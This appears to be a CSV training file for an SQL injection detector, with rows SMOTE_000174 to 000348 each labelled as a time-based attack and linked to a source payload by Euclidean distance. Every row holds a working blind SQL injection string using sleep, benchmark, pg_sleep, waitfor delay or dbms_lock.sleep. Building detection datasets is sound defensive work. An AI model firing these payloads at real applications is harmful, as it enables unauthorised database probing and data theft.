id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000174,attack,time,1'   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000522,0.0069931093673045695
SMOTE_000175,attack,time,1'  )   as xrap where 5523  =  5523 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000655,0.26999945716068074
SMOTE_000176,attack,time,"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000355,0.24522271210052182
SMOTE_000177,attack,time,1'  )   and sleep  (  5  )  #,nearest_attack_euclidean,R000610,0.14412170375721414
SMOTE_000178,attack,time,"select sleep  (  5  )   and   (  ""innk""  =  ""innk",nearest_attack_euclidean,R000219,0.2761215317857411
SMOTE_000179,attack,time,1'  )   where 8142  =  8142 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000911,0.36269375902946394
SMOTE_000180,attack,time, (  select   (  case when   (  9337  =  9337  )   then waitfor delay '0:0:5' else 9337*  (  select 9337 from master..sysdatabases  )   end   )    ) ,nearest_attack_euclidean,R001111,0.22325903239461165
SMOTE_000181,attack,time,select pg_sleep  (  5  )   and   (  1044  =  1044,nearest_attack_euclidean,R000476,0.06078870848498859
SMOTE_000182,attack,time,1   )    )     )   or sleep  (  5  )  #,nearest_attack_euclidean,R000593,0.7317802463504148
SMOTE_000183,attack,time,"1'   )    )    as wves where 2641  =  2641 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000725,0.0839500484391642
SMOTE_000184,attack,time,"1""  )   as gjlv where 1983  =  1983 and sleep  (  5  )  #",nearest_attack_euclidean,R000450,0.34674699818626964
SMOTE_000185,attack,time,"1""   )    )    rlike sleep  (  5  )   and    (    (   ""fzlr""  =  ""fzlr",nearest_attack_euclidean,R000366,0.9804758627571942
SMOTE_000186,attack,time,1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',nearest_attack_euclidean,R000843,0.6221856716955539
SMOTE_000187,attack,time,"1%""   )    )    rlike sleep  (  5  )  #",nearest_attack_euclidean,R000170,0.47943257065140044
SMOTE_000188,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R000214,0.02030064803274745
SMOTE_000189,attack,time,1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   'krvo' like 'krvo,nearest_attack_euclidean,R000840,0.30009944250542936
SMOTE_000190,attack,time,1   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000696,0.199848692694716
SMOTE_000191,attack,time,1%'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000373,0.15291161964585342
SMOTE_000192,attack,time,1%'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000816,0.027630897412922465
SMOTE_000193,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000137,0.5855375841207329
SMOTE_000194,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,nearest_attack_euclidean,R000741,0.12368691589343311
SMOTE_000195,attack,time,"1' and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000928,1.1695343990358302
SMOTE_000196,attack,time,1'||  (  select 'xglm' from dual where 3556  =  3556 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000630,0.5962811269834614
SMOTE_000197,attack,time,1  )   where 9078  =  9078 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000809,0.0678802351172781
SMOTE_000198,attack,time,1   )    )    as sipp where 1999  =  1999 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,nearest_attack_euclidean,R000200,0.4165571049628756
SMOTE_000199,attack,time,1   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  4574  =  4574,nearest_attack_euclidean,R000945,0.1524533719104971
SMOTE_000200,attack,time,"1""   )    )    as wugz where 5355  =  5355 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000855,0.7602805869985099
SMOTE_000201,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000913,0.09616167298230782
SMOTE_000202,attack,time,"1"" where 2547  =  2547 or sleep  (  5  )  #",nearest_attack_euclidean,R000600,0.38542825088962895
SMOTE_000203,attack,time,"1%'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000668,0.06353566115381137
SMOTE_000204,attack,time,"waitfor delay '0:0:5' and ""%""  =  """,nearest_attack_euclidean,R000258,0.3439576364498593
SMOTE_000205,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.34411727116100993
SMOTE_000206,attack,time,"1'  )   where 8252  =  8252 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R001140,0.4016543169234047
SMOTE_000207,attack,time,"1',  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000310,0.9760376285635205
SMOTE_000208,attack,time,waitfor delay '0:0:5'  )  +',nearest_attack_euclidean,R000906,0.21849622215562303
SMOTE_000209,attack,time,"1""   )    )    as zval where 2255  =  2255 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000415,0.48380407881093146
SMOTE_000210,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.46267347956956356
SMOTE_000211,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000100,1.3443585132811136
SMOTE_000212,attack,time,1   )    )    waitfor delay '0:0:5' and    (    (   1636  =  1636,nearest_attack_euclidean,R000362,0.5389545499377378
SMOTE_000213,attack,time,"1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000386,0.4240581497425964
SMOTE_000214,attack,time,"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",nearest_attack_euclidean,R000719,0.12497216470848423
SMOTE_000215,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  'ksoc'  =  'ksoc,nearest_attack_euclidean,R000615,0.4590472332730861
SMOTE_000216,attack,time,"1   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  2341  =  2341",nearest_attack_euclidean,R000257,0.09841048132089103
SMOTE_000217,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  ""cadh"" like ""cadh",nearest_attack_euclidean,R000584,0.8955031349117459
SMOTE_000218,attack,time,"1%'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000723,0.5793727573225144
SMOTE_000219,attack,time,"1%""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000744,0.06799577732166079
SMOTE_000220,attack,time,"1%'   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000705,0.1784306705055956
SMOTE_000221,attack,time,"1   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R001027,0.5511860225023377
SMOTE_000222,attack,time,"1 where 8390  =  8390 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000493,0.13413984587967132
SMOTE_000223,attack,time,"1' where 7014  =  7014 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000528,0.4826741595631144
SMOTE_000224,attack,time,"1%'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000674,0.04647612626922498
SMOTE_000225,attack,time,1   )    )    as xbii where 2262  =  2262 or sleep  (  5  )  --,nearest_attack_euclidean,R000785,0.6152226611242684
SMOTE_000226,attack,time,"1"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""mynm"" like ""mynm",nearest_attack_euclidean,R000992,0.4363269366081333
SMOTE_000227,attack,time,1   )    )    as qgma where 7675  =  7675 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000826,0.24992247722979744
SMOTE_000228,attack,time,"1%""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000845,0.39694598606535747
SMOTE_000229,attack,time,"1%""   )    )    and sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000884,0.9692006502507664
SMOTE_000230,attack,time,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000686,0.10484510266213584
SMOTE_000231,attack,time,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,nearest_attack_euclidean,R001119,0.16749901205975687
SMOTE_000232,attack,time,"1""   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000697,0.34564899437291124
SMOTE_000233,attack,time,"1""  )   where 5814  =  5814 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000292,0.06063040398526955
SMOTE_000234,attack,time,"1""   )    )    or sleep  (  5  )   and    (    (   ""mcyv""  =  ""mcyv",nearest_attack_euclidean,R000515,0.6931943129598103
SMOTE_000235,attack,time,"1'+  (  select vxax where 9036  =  9036 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000999,1.2782082141414346
SMOTE_000236,attack,time,"select sleep  (  5  )   and    (    (     (  ""lczw""  =  ""lczw",nearest_attack_euclidean,R000486,0.16084365149202756
SMOTE_000237,attack,time,1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv,nearest_attack_euclidean,R001076,0.6085624583783451
SMOTE_000238,attack,time,select sleep  (  5  )  # yrpn,nearest_attack_euclidean,R001094,0.6487614702654005
SMOTE_000239,attack,time,1' in boolean mode  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000971,0.4845889309319419
SMOTE_000240,attack,time,1'+  (  select 'diet' where 7004  =  7004 rlike sleep  (  5   )    )   +',nearest_attack_euclidean,R000764,1.380576704140843
SMOTE_000241,attack,time,"1   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   8024  =  8024",nearest_attack_euclidean,R000646,0.8887576293553251
SMOTE_000242,attack,time,select sleep  (  5  )   and   (  'qcsv'  =  'qcsv,nearest_attack_euclidean,R001077,0.06955062587575862
SMOTE_000243,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  ",nearest_attack_euclidean,R000980,0.11914060995038148
SMOTE_000244,attack,time,1'  )   waitfor delay '0:0:5',nearest_attack_euclidean,R000648,0.0016798195883041423
SMOTE_000245,attack,time,"1%""   )    )     )   and sleep  (  5  )  #",nearest_attack_euclidean,R000372,0.03759813609709853
SMOTE_000246,attack,time,"1'||  (  select 'jrbp' from dual where 4129  =  4129 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000818,0.12291760034043453
SMOTE_000247,attack,time,1  )   where 2468  =  2468 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000657,0.06550456177100322
SMOTE_000248,attack,time,1 waitfor delay '0:0:5'# opyp,nearest_attack_euclidean,R000701,1.684571729979368
SMOTE_000249,attack,time,"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000355,0.17013119946072042
SMOTE_000250,attack,time,select sleep  (  5  )   and    (    (     (  8354  =  8354,nearest_attack_euclidean,R000756,0.5014707371555425
SMOTE_000251,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000260,0.23480862493221258
SMOTE_000252,attack,time,"1 where 8390  =  8390 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000493,1.5992759843720132
SMOTE_000253,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,0.29227567604104593
SMOTE_000254,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.1930316917063026
SMOTE_000255,attack,time,1 rlike sleep  (  5  )  # urxh,nearest_attack_euclidean,R000754,0.07134424886860267
SMOTE_000256,attack,time,"1""   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --",nearest_attack_euclidean,R000962,0.7672533865438607
SMOTE_000257,attack,time,"1%""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000464,0.26250887608571455
SMOTE_000258,attack,time,1%'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000574,0.5229841231410997
SMOTE_000259,attack,time,"1""   )    )    as wugz where 5355  =  5355 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000855,0.2532988914861151
SMOTE_000260,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq,nearest_attack_euclidean,R000475,0.2936403300346402
SMOTE_000261,attack,time,"1 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   -- rlas",nearest_attack_euclidean,R000346,1.1169448433987719
SMOTE_000262,attack,time,"1'  )   as wnys where 6457  =  6457 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000501,0.007022969029256283
SMOTE_000263,attack,time,select sleep  (  5  )   and   (  'vwmx'  =  'vwmx,nearest_attack_euclidean,R000925,0.4636634796365015
SMOTE_000264,attack,time,1'+  (  select 'toec' where 5810  =  5810 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000309,0.4666060672337644
SMOTE_000265,attack,time,"1""   )    )    as yuqr where 7226  =  7226 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000955,0.9130922147726496
SMOTE_000266,attack,time,1   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  1601  =  1601,nearest_attack_euclidean,R000266,0.02745901005609746
SMOTE_000267,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000122,0.014701211970465757
SMOTE_000268,attack,time,1   )    )     )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000093,1.1377030952813523
SMOTE_000269,attack,time,1%'   )    )    rlike sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000414,0.10846885010103251
SMOTE_000270,attack,time,1' in boolean mode  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000971,1.0078304507107827
SMOTE_000271,attack,time,select sleep  (  5  )   and 'hhrw' like 'hhrw,nearest_attack_euclidean,R001049,0.4093621511507469
SMOTE_000272,attack,time,"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",nearest_attack_euclidean,R000719,0.48133531789262785
SMOTE_000273,attack,time,"1  )   as agex where 8167  =  8167 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000920,0.9761487548118628
SMOTE_000274,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000731,0.726685519036781
SMOTE_000275,attack,time,1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000781,0.25895569108842215
SMOTE_000276,attack,time,"1   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   8189  =  8189",nearest_attack_euclidean,R000439,0.10179007847152605
SMOTE_000277,attack,time,select sleep  (  5  )   and    (    (   8679  =  8679,nearest_attack_euclidean,R000536,0.5073820998353329
SMOTE_000278,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000647,0.0644399109683305
SMOTE_000279,attack,time,1' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000599,0.6399245508409677
SMOTE_000280,attack,time,"1%'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000668,0.018654863151654957
SMOTE_000281,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'zqiw'  =  'zqiw,nearest_attack_euclidean,R000318,0.28507192478781995
SMOTE_000282,attack,time,"1'  )   as idqc where 5288  =  5288 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R001176,0.2799573284576489
SMOTE_000283,attack,time,waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,nearest_attack_euclidean,R000137,0.3016804246357448
SMOTE_000284,attack,time,1'+  (  select echl where 6593  =  6593 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000169,0.9750283723687447
SMOTE_000285,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,nearest_attack_euclidean,R000741,0.4952740451109543
SMOTE_000286,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000503,0.5900449667341862
SMOTE_000287,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000632,1.2197347572025252
SMOTE_000288,attack,time,"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""grct""  =  ""grct",nearest_attack_euclidean,R000334,0.24444260742832202
SMOTE_000289,attack,time,"1,  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R000296,4.925872143537818
SMOTE_000290,attack,time,waitfor delay '0:0:5'--,nearest_attack_euclidean,R000265,0.13256052042709568
SMOTE_000291,attack,time,"1'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   'ossj'  =  'ossj",nearest_attack_euclidean,R000806,0.8466328637071386
SMOTE_000292,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",nearest_attack_euclidean,R001042,0.2688474009657235
SMOTE_000293,attack,time,select sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000298,0.3496093255714085
SMOTE_000294,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.7676980617286417
SMOTE_000295,attack,time,"1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000509,0.2653374328203131
SMOTE_000296,attack,time,1%'   )    )    rlike sleep  (  5  )   and    (    (   '%'  =  ',nearest_attack_euclidean,R000414,0.9871616526393879
SMOTE_000297,attack,time,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,nearest_attack_euclidean,R001119,0.26150403016621193
SMOTE_000298,attack,time,1'  )   where 1645  =  1645 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000307,0.7396443966624371
SMOTE_000299,attack,time,"1""  )   rlike sleep  (  5  )   and   (  ""efoq"" like ""efoq",nearest_attack_euclidean,R000550,0.6979299640806205
SMOTE_000300,attack,time,1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000849,0.9071234667353694
SMOTE_000301,attack,time,"1""   )    )    as rhea where 2982  =  2982 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",nearest_attack_euclidean,R000966,0.40348750342638195
SMOTE_000302,attack,time,"1%' or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000284,0.011116139212731283
SMOTE_000303,attack,time,"1""   )    )    or sleep  (  5  )  #",nearest_attack_euclidean,R000524,0.22783552851370079
SMOTE_000304,attack,time,1'  )   and sleep  (  5  )   and   (  'njud'  =  'njud,nearest_attack_euclidean,R000352,0.8058012163706257
SMOTE_000305,attack,time,1'  )   as xrap where 5523  =  5523 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000655,0.42593810769324914
SMOTE_000306,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,0.30417504423986874
SMOTE_000307,attack,time,1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000060,0.17297886667877155
SMOTE_000308,attack,time,1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',nearest_attack_euclidean,R000649,1.2956786514446434
SMOTE_000309,attack,time,"select pg_sleep  (  5  )   and ""ilyw"" like ""ilyw",nearest_attack_euclidean,R000689,0.3183373241764939
SMOTE_000310,attack,time,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R001146,0.6418393947796228
SMOTE_000311,attack,time,"1'||  (  select 'eils' where 8308  =  8308 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R001143,0.29571724062519433
SMOTE_000312,attack,time,1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'lzbn'  =  'lzbn,nearest_attack_euclidean,R000985,0.17259872069678164
SMOTE_000313,attack,time,"1"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000160,0.31590501543655364
SMOTE_000314,attack,time,"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'udvq'  =  'udvq",nearest_attack_euclidean,R000678,0.6328149632975534
SMOTE_000315,attack,time,"1   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  6556  =  6556",nearest_attack_euclidean,R000605,0.8064593980789866
SMOTE_000316,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,2.0724397634900376
SMOTE_000317,attack,time,"1' where 7080  =  7080 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000570,0.42462882399727925
SMOTE_000318,attack,time,"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'bemh'  =  'bemh",nearest_attack_euclidean,R001124,0.007699834127277406
SMOTE_000319,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )     )  +'",nearest_attack_euclidean,R000423,0.5765212027462638
SMOTE_000320,attack,time,"1%""   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000882,0.8273010841470944
SMOTE_000321,attack,time,select sleep  (  5  )  # yrpn,nearest_attack_euclidean,R001094,1.1703022502847291
SMOTE_000322,attack,time,"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""ipqw"" like ""ipqw",nearest_attack_euclidean,R000186,0.318525873665539
SMOTE_000323,attack,time,1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,nearest_attack_euclidean,R000124,0.05925830369001924
SMOTE_000324,attack,time,"1""  )   as lexx where 2892  =  2892 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R001126,0.47753025231895796
SMOTE_000325,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and 'vnkr' like 'vnkr,nearest_attack_euclidean,R001013,0.16453954337238508
SMOTE_000326,attack,time,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R001115,0.3703936403256203
SMOTE_000327,attack,time,1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000163,0.2921797378097561
SMOTE_000328,attack,time,else dbms_lock.sleep  (  0  ) ,nearest_attack_euclidean,R000954,0.46161290264404187
SMOTE_000329,attack,time,1' waitfor delay '0:0:5',nearest_attack_euclidean,R000895,0.12362256324449775
SMOTE_000330,attack,time,select pg_sleep  (  5  )   and    (    (   4382  =  4382,nearest_attack_euclidean,R000419,0.24674829593549516
SMOTE_000331,attack,time,"1,  (  begin if   (  8340  =  8340  )   then dbms_lock.sleep  (  5  )  ",nearest_attack_euclidean,R000788,0.06847488699979207
SMOTE_000332,attack,time,1  )   as obzn where 7652  =  7652 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R001091,0.1351160928196539
SMOTE_000333,attack,time,select sleep  (  5  )  -- waln,nearest_attack_euclidean,R000294,1.1235372399329864
SMOTE_000334,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,1.6644611972000365
SMOTE_000335,attack,time,select sleep  (  5   )    )   +',nearest_attack_euclidean,R000463,2.906018379944488
SMOTE_000336,attack,time,1  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000399,0.53867018034405
SMOTE_000337,attack,time,"1'   )    )    as hbdi where 6758  =  6758 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R000827,0.13477884551416264
SMOTE_000338,attack,time,1%'   )    )     )   and sleep  (  5  )  #,nearest_attack_euclidean,R000262,0.3199722009427797
SMOTE_000339,attack,time,1 waitfor delay '0:0:5'# opyp,nearest_attack_euclidean,R000701,0.5705253842868325
SMOTE_000340,attack,time,select sleep  (  5  )   and 'beuk'  =  'beuk,nearest_attack_euclidean,R000586,0.05058521585373769
SMOTE_000341,attack,time,1'+  (  select 'sbji' where 7989  =  7989 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',nearest_attack_euclidean,R000209,0.8096527451293967
SMOTE_000342,attack,time,"1""  )   where 4878  =  4878 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",nearest_attack_euclidean,R001073,0.4196806205624826
SMOTE_000343,attack,time,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  7015  =  7015,nearest_attack_euclidean,R000435,1.5372503158170536
SMOTE_000344,attack,time,"1' where 7014  =  7014 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000528,0.16663375390722113
SMOTE_000345,attack,time,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R001069,0.39653791844761793
SMOTE_000346,attack,time,"1%""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000939,0.06865823860174203
SMOTE_000347,attack,time,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000686,0.4094033932191513
SMOTE_000348,attack,time,"1"" rlike sleep  (  5  )  #",nearest_attack_euclidean,R000359,0.6880019919940538
